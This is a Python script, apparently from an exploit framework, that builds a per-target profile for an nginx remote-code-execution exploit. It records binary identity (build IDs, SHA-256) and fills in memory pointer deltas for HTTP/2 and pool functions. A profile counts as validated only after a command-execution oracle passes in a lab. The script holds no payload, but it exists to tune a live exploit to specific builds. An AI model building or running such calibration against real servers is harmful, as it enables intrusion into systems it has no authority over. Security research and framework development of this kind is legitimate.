#!/usr/bin/env python3
"""Generate a local Rapid7-style target profile for an nginx build.

This implements the calibration workflow we used for nginx 1.31.7:
- read identity (version, build-id, SHA-256) from nginx and libc;
- copy a known base profile (heap/transport fields) and patch target fields;
- set the nginx-image pointer deltas recovered with
  scan_nginx_deltas.py / match_nginx_functions.py.

The result is marked "unvalidated" unless --mark-validated is given. Only mark
a profile validated after an end-to-end command-execution oracle passed in
your own lab.

Requires `readelf` (binutils) for build IDs.

Usage:
    python3 make_profile.py --base golden.json --nginx nginx-new \
        --libc libc.so.6 --name local-nginx-1.31.7-debian13-amd64 \
        --send-chain-delta 139984 --resolver-timeout-delta -310784 \
        --destroy-pool-delta -399344 \
        --out local-nginx-1.31.7-debian13-amd64.json
"""
import argparse
import hashlib
import json
import re
import subprocess
import sys


def sha256(path):
    digest = hashlib.sha256()
    with open(path, "rb") as handle:
        for chunk in iter(lambda: handle.read(1 << 20), b""):
            digest.update(chunk)
    return digest.hexdigest()


def readelf_build_id(path):
    try:
        output = subprocess.run(
            ("readelf", "-n", "--wide", path),
            capture_output=True, text=True, check=False)
    except FileNotFoundError:
        raise SystemExit("readelf not found; install binutils")
    match = re.search(r"Build ID:\s*([0-9a-f]+)", output.stdout)
    if not match:
        raise SystemExit(f"could not find Build ID in {path}")
    return match.group(1)


def nginx_version(path):
    with open(path, "rb") as handle:
        data = handle.read()
    match = re.search(rb"nginx/([0-9]+\.[0-9]+\.[0-9]+)", data)
    if not match:
        raise SystemExit(f"could not find nginx version in {path}")
    return match.group(1).decode()


def libc_label(path):
    with open(path, "rb") as handle:
        data = handle.read()
    match = re.search(rb"Debian GLIBC ([0-9][0-9A-Za-z.+~-]*)", data)
    if match:
        return "Debian glibc " + match.group(1).decode()
    match = re.search(rb"GNU C Library[^\x00]*version ([0-9][0-9A-Za-z.+~-]*)",
                      data)
    if match:
        return "glibc " + match.group(1).decode()
    return "unknown"


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base", required=True)
    parser.add_argument("--nginx", required=True)
    parser.add_argument("--libc", required=True)
    parser.add_argument("--name", required=True)
    parser.add_argument("--out", required=True)
    parser.add_argument("--send-chain-delta", type=int, required=True)
    parser.add_argument("--resolver-timeout-delta", type=int, required=True)
    parser.add_argument("--destroy-pool-delta", type=int, required=True)
    parser.add_argument("--triple", default="0,-464,-13568",
                        help="comma-separated nginx_image_pointer_deltas")
    parser.add_argument("--settings", default=None,
                        help="JSON list for fingerprint.http2_settings")
    parser.add_argument("--server-header", default=None)
    parser.add_argument("--openssl-built", default=None)
    parser.add_argument("--openssl-runtime", default=None)
    parser.add_argument("--mark-validated", action="store_true")
    args = parser.parse_args()

    with open(args.base, "r", encoding="utf-8") as handle:
        profile = json.load(handle)

    triple = [int(item, 0) for item in args.triple.split(",")]
    version = nginx_version(args.nginx)

    profile["name"] = args.name
    profile["calibration"] = {
        "status": "validated" if args.mark_validated else "unvalidated",
        "backend": profile.get("calibration", {}).get(
            "backend", "x86-64-glibc-evex-v1"),
        "evidence": (
            "LOCAL RECALIBRATION: identity from target binaries; nginx image "
            "deltas recovered by signature matching; end-to-end oracle "
            + ("PASSED" if args.mark_validated else "PENDING")),
    }

    target = profile.setdefault("target", {})
    target["nginx_version"] = version
    target["nginx_build_id"] = readelf_build_id(args.nginx)
    target["nginx_sha256"] = sha256(args.nginx)
    target["libc"] = libc_label(args.libc)
    target["libc_build_id"] = readelf_build_id(args.libc)
    target["libc_sha256"] = sha256(args.libc)
    if args.openssl_built:
        target["openssl_built_against"] = args.openssl_built
    if args.openssl_runtime:
        target["openssl_runtime"] = args.openssl_runtime

    fingerprint = profile.setdefault("fingerprint", {})
    fingerprint["server_header"] = (
        args.server_header or f"nginx/{version}")
    fingerprint["nginx_image_pointer_deltas"] = triple
    fingerprint["http2_send_chain_delta"] = args.send_chain_delta
    fingerprint["resolver_timeout_delta"] = args.resolver_timeout_delta
    fingerprint["destroy_pool_delta"] = args.destroy_pool_delta
    if args.settings:
        fingerprint["http2_settings"] = json.loads(args.settings)

    with open(args.out, "w", encoding="utf-8") as handle:
        json.dump(profile, handle, indent=2)
        handle.write("\n")

    print(f"wrote {args.out}")
    print(f"nginx={version} build_id={target['nginx_build_id']}")
    print(f"libc={target['libc']} sha256={target['libc_sha256']}")
    print("deltas: "
          f"triple={triple} send_chain={args.send_chain_delta} "
          f"resolver={args.resolver_timeout_delta} "
          f"destroy_pool={args.destroy_pool_delta}")
    if not args.mark_validated:
        print("NOTE: profile marked unvalidated; run an end-to-end oracle "
              "and re-generate with --mark-validated in your lab.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
